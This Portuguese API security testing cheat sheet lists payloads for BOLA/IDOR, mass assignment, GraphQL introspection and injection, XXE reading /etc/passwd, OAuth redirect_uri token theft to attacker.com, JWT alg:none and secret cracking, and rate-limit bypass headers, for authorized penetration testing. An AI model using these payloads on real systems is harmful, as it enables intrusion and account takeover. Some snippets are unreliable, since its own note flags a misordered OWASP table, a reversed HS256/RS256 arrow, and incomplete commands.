# 🔌 Guia de referência de testes de segurança de API

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de precisão:** a tabela do original não segue totalmente a ordem OWASP de 2023: API6 refere-se ao acesso irrestrito a fluxos de negócio sensíveis, API7 a SSRF e API8 a configurações de segurança incorretas; API9 trata a gestão do inventário. [Lista oficial OWASP](https://owasp.org/API-Security/editions/2023/en/0x11-t10/). Na confusão de algoritmos JWT, o caso descrito corresponde a RS256 → HS256, usando a chave pública como segredo HMAC; a seta inversa do comentário original foi preservada. [Explicação da PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion). Alguns excertos são incompletos: a consulta de sugestões GraphQL não fecha todas as chavetas e o curl de XXE não indica URL. Um JWT compacto contém segmentos Base64url separados por pontos; não se descodifica integralmente com um único `base64 -d`. Um *endpoint* é um ponto de acesso da API; *mass assignment* é a associação automática de campos recebidos a propriedades internas.

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 Índice

- [OWASP API Top 10](#-owasp-api-top-10)
- [Testes de API REST](#-rest-api-testing)
- [Testes de GraphQL](#-graphql-testing)
- [Ataques à autenticação](#-authentication-attacks)
- [Ataques a JWT](#-jwt-attacks)
- [Vulnerabilidades comuns](#-common-vulnerabilities)

---

<a id="-owasp-api-top-10"></a>
## 🔴 OWASP API Top 10

| # | Vulnerabilidade | Descrição |
|---|---------------|-------------|
| 1 | **BOLA** | Falhas na autorização ao nível dos objetos |
| 2 | **Falhas de autenticação** | Fragilidades na autenticação |
| 3 | **BOPLA** | Falhas na autorização ao nível das propriedades dos objetos |
| 4 | **Consumo de recursos sem restrições** | Ausência de limites de pedidos |
| 5 | **BFLA** | Falhas na autorização ao nível das funções |
| 6 | **SSRF** | Falsificação de pedidos pelo servidor |
| 7 | **Configuração de segurança incorreta** | Configurações predefinidas |
| 8 | **Falta de proteção** | Fluxos de negócio |
| 9 | **Gestão inadequada de ativos** | APIs antigas |
| 10 | **Consumo inseguro de APIs** | Serviços de terceiros |

---

<a id="-rest-api-testing"></a>
## 🌐 Testes de API REST

### Descoberta e enumeração

```bash
# Encontrar endpoints de API
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Enumeração de versões
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Caminhos comuns
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### Testes de métodos HTTP

```bash
# Testar todos os métodos
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Substituição do método
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Manipulação de parâmetros

```bash
# BOLA/IDOR
GET /api/users/1      # O seu identificador
GET /api/users/2      # Identificador de outro utilizador
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Poluição de parâmetros
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Contorno através de codificação
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Ataques através de Content-Type

```bash
# Alterar Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE através de Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Atribuição em massa (mass assignment)

```bash
# Adicionar campos extra
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Experimentar adicionar
  "isAdmin": true,           # Experimentar adicionar
  "balance": 99999,          # Experimentar adicionar
  "verified": true           # Experimentar adicionar
}

# Utilizar arrays
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

<a id="-graphql-testing"></a>
## 📊 Testes de GraphQL

### Introspeção

```graphql
# Consulta de introspeção completa
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Introspeção simples
{__schema{types{name,fields{name}}}}

# Obter todas as consultas
{__schema{queryType{fields{name,description}}}}

# Obter todas as mutações
{__schema{mutationType{fields{name,description}}}}
```

### Ataques comuns

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Ataque com operações agrupadas (batching)
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Negação de serviço através de consultas aninhadas
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Sugestões de campos
{ user { a }  # Irá sugerir campos válidos
```

### Injeção de SQL em GraphQL

```graphql
# Injeção de SQL nos argumentos
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# Injeção de NoSQL
query { user(query: "{$gt: ''}") { id } }
```

### Contornar a desativação da introspeção

```graphql
# Introspeção alternativa
query { __type(name: "User") { fields { name } } }

# Enumeração de campos por força bruta com ffuf
# Utilizar uma lista de nomes de campos GraphQL comuns
```

---

<a id="-authentication-attacks"></a>
## 🔐 Ataques à autenticação

### Testes de chaves de API

```bash
# Encontrar chaves de API
# Analisar ficheiros JavaScript, aplicações móveis e GitHub

# Testar a chave em locais diferentes
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### Ataques a OAuth/OAuth2

```bash
# Roubo de tokens através de redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Contornar o parâmetro state
# Remover o parâmetro state
# Utilizar o mesmo state para utilizadores diferentes

# Fuga de tokens
# Verificar se o cabeçalho Referer divulga tokens
```

### Gestão de sessões

```bash
# Enumeração de tokens
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Os tokens antigos continuam válidos após terminar a sessão?
# Problemas de rotação de tokens
# Reutilização de tokens entre sessões
```

---

<a id="-jwt-attacks"></a>
## 🎫 Ataques a JWT

### Descodificar um JWT

```bash
# Na Web: jwt.io
# Linha de comandos (CLI)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Confusão de algoritmos

```bash
# Alterar alg para none
{
  "alg": "none",
  "typ": "JWT"
}
# Remover a assinatura

# Ataque HS256 → RS256
# Utilizar a chave pública como segredo HMAC
```

### Contornar a verificação da assinatura

```bash
# Remover a assinatura (manter os pontos)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Descobrir um segredo fraco por força bruta
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Segredos fracos comuns
secret
password
123456
your-256-bit-secret
```

### Manipulação de claims (atributos do token)

```javascript
// Alterar os atributos do utilizador no token (claims)
{
  "sub": "1234567890",
  "name": "admin",        // Alterar para admin
  "role": "admin",        // Elevar o papel atribuído
  "admin": true,          // Adicionar o indicador de administrador
  "exp": 9999999999       // Prolongar o prazo de validade
}
```

### Ferramentas de JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Manipular
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Descobrir o segredo

# jwtcrack
./jwtcrack <JWT>
```

---

<a id="-common-vulnerabilities"></a>
## 🐛 Vulnerabilidades comuns

### Contornar limites de pedidos

```bash
# Cabeçalhos a experimentar
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Alterar maiúsculas e minúsculas
X-FORWARDED-FOR: 127.0.0.1

# Byte nulo
X-Forwarded-For: 127.0.0.1%00

# Endpoints diferentes
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA (falhas na autorização ao nível dos objetos)

```bash
# Testar a manipulação de identificadores
GET /api/orders/123    # A sua encomenda
GET /api/orders/124    # Encomenda de outro utilizador

# Tentar adivinhar UUIDs
# Procurar padrões previsíveis
# Experimentar valores sequenciais ou baseados em marcas temporais

# Identificador em formatos diferentes
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA (falhas na autorização ao nível das funções)

```bash
# Aceder a endpoints de administração como utilizador comum
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Baseado no método
GET /api/users     # Permitido
POST /api/users    # Deveria estar limitado a administradores?
DELETE /api/users  # Deveria estar limitado a administradores?
```

### Gestão inadequada de ativos

```bash
# Versões antigas da API
/api/v1/users    # Pode ter mais vulnerabilidades
/api/v2/users    # Atual
/api/v3/users    # Beta ou ainda não publicada

# Endpoints de desenvolvimento
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Ferramentas

| Ferramenta | Finalidade |
|------|---------|
| **Burp Suite** | Interceção e testes de API |
| **Postman** | Exploração de API |
| **Insomnia** | Cliente REST/GraphQL |
| **graphql-voyager** | Visualização de GraphQL |
| **jwt_tool** | Testes de JWT |
| **Arjun** | Deteção de parâmetros |

---

## 📚 Recursos

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Proteja as suas APIs!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
